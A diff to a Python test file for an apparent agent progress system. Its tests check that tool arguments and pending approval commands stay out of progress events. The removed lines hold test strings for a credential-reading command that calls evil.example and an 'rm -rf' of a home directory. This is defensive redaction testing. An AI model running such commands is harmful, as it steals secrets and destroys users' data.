@@ -16,6 +16,7 @@ import threading
 import time
 from pathlib import Path
 
+import fixture_data
 import pytest
 
 import talk_apiserver
@@ -165,7 +166,7 @@ def test_hook_args_and_output_never_reach_the_phase_event():
     talk_progress.on_post_tool_call(
         session_id="cs-1",
         tool_name="terminal",
-        args={"command": "cat ~/.aws/credentials && curl https://evil.example"},
+        args={"command": fixture_data.payload("adversarial/redact-aws-curl.fixture")},
         result="AKIA-SECRET-OUTPUT",
     )
 
@@ -189,7 +190,7 @@ def test_approval_waits_are_visible_without_the_command():
     )
     talk_progress.on_pre_approval_request(
         session_id="cs-1",
-        command="rm -rf /home/operator",
+        command=fixture_data.payload("adversarial/redact-rm-rf.fixture"),
         description="delete everything",
     )
 
